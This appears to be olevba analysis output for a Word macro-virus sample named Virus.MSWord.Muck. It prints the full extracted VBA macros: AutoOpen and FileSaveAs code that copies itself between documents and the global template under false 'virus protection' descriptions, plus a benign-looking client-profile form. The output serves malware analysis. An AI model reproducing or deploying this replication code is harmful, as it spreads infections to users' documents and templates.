olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Muck-8eab84505b1cd759ed425c89bb6c7390b685c682
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Muck-8eab84505b1cd759ed425c89bb6c7390b685c682 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Muck-8eab84505b1cd759ed425c89bb6c7390b685c682 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
WordBasic.FileSaveAs Format:=1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Muck-8eab84505b1cd759ed425c89bb6c7390b685c682 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
On Error Resume Next
WordBasic.Call "CAP.S", WordBasic.[FileName$]()
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Muck-8eab84505b1cd759ed425c89bb6c7390b685c682 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%S"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
On Error Resume Next
WordBasic.Call "CAP.FS"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Muck-8eab84505b1cd759ed425c89bb6c7390b685c682 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Wazzu Virus Protection.  Used to install the Autoexec macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExit", "Global:AutoExit", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSaveAs", "Global:FileSaveAs", ExecuteOnly


WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
WordBasic.FileSaveAll 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: Virus.MSWord.Muck-8eab84505b1cd759ed425c89bb6c7390b685c682 - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Muck-8eab84505b1cd759ed425c89bb6c7390b685c682 - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "When creating a new document this macro shows the IMI toolbar, maximizes the document, and zooms to fit page width."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoNew.MAIN"
Dim Choice
Dim Country$
Dim Industry$
Dim RevCurrency$
Dim Currency_$
Dim RefAcct$
Dim ClientName$
Dim InputBy$
Dim ParentName$
Dim Revenue$
Dim Employees$
Dim ProjectName$
Dim ELName$
Dim JobStartMonth$
Dim JobStartYear$
Dim JobEndMonth$
Dim JobEndYear$
Dim JobValue$
Dim DealDatabase$
Dim DealApps$
Dim DealConsulting$
Dim DealEducation$
Dim Service1$
Dim Service2$
Dim Service3$
Dim Service4$
Dim Service5$
Dim Service6$
Dim ServiceEtc$
Dim JobStartDate$
Dim JobEndDate$
Dim OCMService$

ReDim Country__$(21)
Country__$(0) = "Autralia": Country__$(1) = "Belgium": Country__$(2) = "Canada": Country__$(3) = "Denmark": Country__$(4) = "France": Country__$(5) = "Germany": Country__$(6) = "HongKong": Country__$(7) = "India": Country__$(8) = "Italy": Country__$(9) = "Japan": Country__$(10) = "Mexico": Country__$(11) = "Netherlands": Country__$(12) = "Pakistan": Country__$(9) = "Singapore": Country__$(14) = "South Africa": Country__$(15) = "UK": Country__$(16) = "US": Country__$(17) = "Other Africa": Country__$(18) = "Other Asia": Country__$(19) = "Other Europe": Country__$(20) = "Other Americas"

ReDim Industry__$(11)
Industry__$(0) = "Communications": Industry__$(1) = "Consumer Packaged Goods": Industry__$(2) = "Energy": Industry__$(3) = "Financial Services": Industry__$(4) = "Government": Industry__$(5) = "High Tech": Industry__$(6) = "Manufacturing": Industry__$(7) = "Natural Resources": Industry__$(8) = "Pharmaceutical": Industry__$(9) = "Public Utilities": Industry__$(10) = "Other"

ReDim RefAcct__$(2)
RefAcct__$(0) = "Yes": RefAcct__$(1) = "No"

ReDim Currency___$(14)
Currency___$(0) = "Aus$": Currency___$(1) = "BF": Currency___$(2) = "Cdn$": Currency___$(3) = "Krona": Currency___$(4) = "FF": Currency___$(5) = "DM": Currency___$(6) = "HK$": Currency___$(7) = "Rp": Currency___$(8) = "Lira": Currency___$(9) = "Yen": Currency___$(10) = "NFL": Currency___$(11) = "Rand": Currency___$(12) = "UK£": Currency___$(13) = "US$"

ReDim RevCurrency__$(14)
RevCurrency__$(0) = "Aus$": RevCurrency__$(1) = "BF": RevCurrency__$(2) = "Cdn$": RevCurrency__$(3) = "Kr": RevCurrency__$(4) = "FF": RevCurrency__$(5) = "DM": RevCurrency__$(6) = "HK$": RevCurrency__$(7) = "Rp": RevCurrency__$(8) = "Lira": RevCurrency__$(9) = "Yen": RevCurrency__$(10) = "NFL": RevCurrency__$(11) = "Rand": RevCurrency__$(12) = "UK£": RevCurrency__$(13) = "US$"

WordBasic.Cancel

WordBasic.ViewPage

'-------------------------------------------------------------------------------------------------------------------
CollectData:
'-----------------------------------------------
WordBasic.BeginDialog 858, 358, "OCM Client Profile - Data Input Form"
    WordBasic.TextBox 157, 18, 194, 18, "ClientName"
    WordBasic.Text 55, 18, 97, 13, "Client Name:", "Text1"
    WordBasic.Text 498, 18, 67, 12, "Industry:", "Text3"
    WordBasic.DropListBox 573, 18, 188, 108, Industry__$(), "IndustryList"
    WordBasic.TextBox 157, 39, 193, 18, "ProjName"
    WordBasic.Text 47, 41, 108, 13, "Project Name:", "Text2"
    WordBasic.DropListBox 573, 37, 188, 74, Country__$(), "CountryList"
    WordBasic.Text 501, 37, 64, 13, "Country:", "Text4"
    WordBasic.Text 19, 65, 129, 13, "Reference Acct?", "Text23"
    WordBasic.DropListBox 160, 62, 81, 31, RefAcct__$(), "RefAcctList"
    WordBasic.Text 71, 87, 75, 13, "Revenue:", "Text6"
    WordBasic.TextBox 156, 85, 109, 18, "Revenue"
    WordBasic.DropListBox 349, 87, 87, 87, RevCurrency__$(), "RevCurrencyList"
    WordBasic.Text 275, 87, 73, 13, "Currency:", "Text24"
    WordBasic.Text 478, 59, 87, 13, "Employees:", "Text22"
    WordBasic.TextBox 575, 57, 109, 18, "Employees"
    WordBasic.TextBox 572, 89, 239, 18, "ParentName"
    WordBasic.Text 505, 92, 56, 12, "Parent:", "Text5"
    WordBasic.GroupBox 19, 123, 376, 131, " Engagement Details "
    WordBasic.TextBox 88, 144, 267, 18, "ELname"
    WordBasic.Text 28, 148, 59, 13, "Leader:", "Text7"
    WordBasic.Text 30, 178, 49, 13, "Value:", "Text11"
    WordBasic.TextBox 85, 176, 90, 18, "JobValue"
    WordBasic.DropListBox 265, 179, 88, 108, Currency___$(), "CurrencyList"
    WordBasic.Text 186, 180, 73, 13, "Currency:", "Text16"
    WordBasic.Text 21, 224, 43, 13, "Start:", "Text12"
    WordBasic.TextBox 67, 221, 52, 18, "JobStartMonth"
    WordBasic.TextBox 124, 221, 50, 18, "JobStartYear"
    WordBasic.Text 217, 223, 36, 13, "End:", "Text13"
    WordBasic.TextBox 260, 221, 53, 18, "JobEndMonth"
    WordBasic.TextBox 317, 221, 50, 18, "JobEndYear"
    WordBasic.Text 66, 205, 48, 13, "Month", "Text14"
    WordBasic.Text 261, 205, 48, 12, "Month", "Text14A"
    WordBasic.Text 129, 205, 36, 13, "Year", "Text15"
    WordBasic.Text 326, 205, 36, 13, "Year", "Text15A"
    WordBasic.GroupBox 410, 125, 415, 94, " OCM Services "
    WordBasic.CheckBox 418, 146, 113, 16, "Org Assess", "ServiceOA"
    WordBasic.CheckBox 418, 164, 117, 16, "Human Perf", "ServiceHPSS"
    WordBasic.CheckBox 418, 182, 71, 16, "Other", "ServiceOther"
    WordBasic.TextBox 488, 181, 331, 18, "ServiceEtc"
    WordBasic.Text 489, 201, 65, 13, "(specify)", "Text26"
    WordBasic.CheckBox 546, 147, 116, 16, "Exec Devel", "ServiceED"
    WordBasic.CheckBox 546, 164, 101, 16, "Learn Sol", "ServiceLS"
    WordBasic.CheckBox 678, 147, 105, 16, "Org Comm", "ServiceOC"
    WordBasic.GroupBox 413, 224, 413, 67, " Oracle Deal Size "
    WordBasic.TextBox 515, 242, 93, 18, "DealDatabase"
    WordBasic.TextBox 712, 242, 95, 18, "DealEd"
    WordBasic.Text 655, 247, 45, 13, "Educ:", "Text20"
    WordBasic.TextBox 515, 263, 94, 18, "DealApps"
    WordBasic.TextBox 712, 264, 95, 18, "DealConsult"
    WordBasic.Text 618, 266, 85, 13, "Consulting:", "Text19"
    WordBasic.Text 463, 267, 44, 13, "Apps:", "Text18"
    WordBasic.Text 431, 247, 79, 13, "Database:", "Text17"
    WordBasic.OKButton 475, 304, 76, 42
    WordBasic.CancelButton 631, 305, 72, 42
    WordBasic.TextBox 101, 272, 292, 18, "InputBy"
    WordBasic.Text 27, 273, 69, 13, "Input By:", "Text8"
WordBasic.EndDialog

'------------------------------------------------------------------------------------------------------------------
ProcessData:
'------------------------------
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
Choice = WordBasic.Dialog.UserDialog(dlg, 1)
If Choice <> -1 Then GoTo Fini
If Choice = -1 Then
    Country$ = Country__$(dlg.CountryList)
    Industry$ = Industry__$(dlg.IndustryList)
    RevCurrency$ = RevCurrency__$(dlg.RevCurrencyList)
    Currency_$ = Currency___$(dlg.CurrencyList)
    RefAcct$ = RefAcct__$(dlg.RefAcctList)

    ClientName$ = dlg.ClientName
    InputBy$ = dlg.InputBy
    ParentName$ = dlg.ParentName
    Revenue$ = dlg.Revenue
    Employees$ = dlg.Employees
    ProjectName$ = dlg.ProjName
    
    ELName$ = dlg.ELName
    
    JobStartMonth$ = dlg.JobStartMonth
    JobStartYear$ = dlg.JobStartYear
    JobEndMonth$ = dlg.JobEndMonth
    JobEndYear$ = dlg.JobEndYear
    JobValue$ = dlg.JobValue

    DealDatabase$ = dlg.DealDatabase
    DealApps$ = dlg.DealApps
    DealConsulting$ = dlg.DealConsult
    DealEducation$ = dlg.DealEd

    If dlg.ServiceOA = 1 Then
        Service1$ = "OA"
    End If
    If dlg.ServiceED = 1 Then
        Service2$ = "ED"
    End If
    If dlg.ServiceOC = 1 Then
        Service3$ = "OC"
    End If
    If dlg.ServiceHPSS = 1 Then
        Service4$ = "HPSS"
    End If
    If dlg.ServiceLS = 1 Then
        Service5$ = "LS"
    End If
    If dlg.ServiceOther = 1 Then
        Service6$ = "Other"
        ServiceEtc$ = dlg.ServiceEtc
    End If
End If

'------------------------------------------------------------------------------------------------------------------
InputToDocument:
'--------------------------------------------
WordBasic.ViewHeader
WordBasic.GoToHeaderFooter
WordBasic.EditBookmark Name:="ClientNameInFooter", SortBy:=0, GoTo:=1
WordBasic.Insert ClientName$
WordBasic.EditBookmark Name:="InputBy", SortBy:=0, GoTo:=1
WordBasic.Insert InputBy$
WordBasic.CloseViewHeaderFooter

WordBasic.EditBookmark Name:="ClientName", SortBy:=0, GoTo:=1
WordBasic.Insert ClientName$
WordBasic.EditBookmark Name:="Country", SortBy:=0, GoTo:=1
WordBasic.Insert Country$
WordBasic.EditBookmark Name:="Industry", SortBy:=0, GoTo:=1
WordBasic.Insert Industry$
WordBasic.EditBookmark Name:="Employees", SortBy:=0, GoTo:=1
WordBasic.Insert Employees$

WordBasic.EditBookmark Name:="Parent", SortBy:=0, GoTo:=1
WordBasic.Insert ParentName$
WordBasic.EditBookmark Name:="ProjectName", SortBy:=0, GoTo:=1
WordBasic.Insert ProjectName$
WordBasic.EditBookmark Name:="ELName", SortBy:=0, GoTo:=1
WordBasic.Insert ELName$
WordBasic.EditBookmark Name:="JobStartDate", SortBy:=0, GoTo:=1
JobStartDate$ = JobStartMonth$ + "/" + JobStartYear$
WordBasic.Insert JobStartDate$
WordBasic.EditBookmark Name:="JobEndDate", SortBy:=0, GoTo:=1
JobEndDate$ = JobEndMonth$ + "/" + JobEndYear$
WordBasic.Insert JobEndDate$
WordBasic.EditBookmark Name:="JobValue", SortBy:=0, GoTo:=1
WordBasic.Insert Currency_$ + JobValue$
WordBasic.EditBookmark Name:="Revenue", SortBy:=0, GoTo:=1
WordBasic.Insert RevCurrency$ + Revenue$

WordBasic.EditBookmark Name:="DealDatabase", SortBy:=0, GoTo:=1
WordBasic.Insert Currency_$ + DealDatabase$
WordBasic.EditBookmark Name:="DealApps", SortBy:=0, GoTo:=1
WordBasic.Insert Currency_$ + DealApps$
WordBasic.EditBookmark Name:="DealConsult", SortBy:=0, GoTo:=1
WordBasic.Insert Currency_$ + DealConsulting$
WordBasic.EditBookmark Name:="DealEd", SortBy:=0, GoTo:=1
WordBasic.Insert Currency_$ + DealEducation$

If Service1$ = "OA" Then
    OCMService$ = "Organizational Assessment"
End If
If Service2$ = "ED" Then
    OCMService$ = OCMService$ + Chr(13) + "Executive Development"
End If
If Service3$ = "OC" Then
    OCMService$ = OCMService$ + Chr(13) + "Organizational Communication"
End If
If Service4$ = "HPSS" Then
    OCMService$ = OCMService$ + Chr(13) + "Human Perf. Support Sys."
End If
If Service5$ = "LS" Then
    OCMService$ = OCMService$ + Chr(13) + "Learning Solutions"
End If
If Service6$ = "Other" Then
    OCMService$ = OCMService$ + Chr(13) + ServiceEtc$
End If
WordBasic.EditBookmark Name:="OCMServices", SortBy:=0, GoTo:=1
WordBasic.Insert OCMService$

WordBasic.EditBookmark Name:="RefAcct", GoTo:=1
WordBasic.Insert RefAcct$
    
'-------------------------------------------------------------------------------------------------------------------
CompletionMessage:
'---------------------------------------------
WordBasic.MsgBox "The information you provided has been recorded.  Please fill in the sections dealing with client objectives, OCM objectives, and key deliverables.  Don't forget to complete the Oracle products in use listing on page 2.", 0

GoTo Finish

'-------------------------------------------------------------------------------------------------------------------
Fini:
'----------------------------------------------
WordBasic.BeginDialog 340, 114, "Cancel This Function?"
    WordBasic.Text 10, 6, 288, 13, "If you cancel now, you will have to fill", "Text27"
    WordBasic.Text 10, 23, 320, 13, "in the Account Profile document manually.", "Text28"
    WordBasic.Text 62, 49, 209, 13, "Do you still wish to cancel?", "Text30"
    WordBasic.PushButton 52, 74, 88, 31, "No", "PushNo"
    WordBasic.PushButton 192, 74, 88, 31, "Yes", "PushYes"
WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog

Dim dlg1 As Object: Set dlg1 = WordBasic.CurValues.UserDialog
Choice = WordBasic.Dialog.UserDialog(dlg, 1)
If Choice < 2 Then
    GoTo CollectData
End If
GoTo Finish
'-------------------------------------------------------------------------------------------------------------------
Finish:
'----------------------------

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

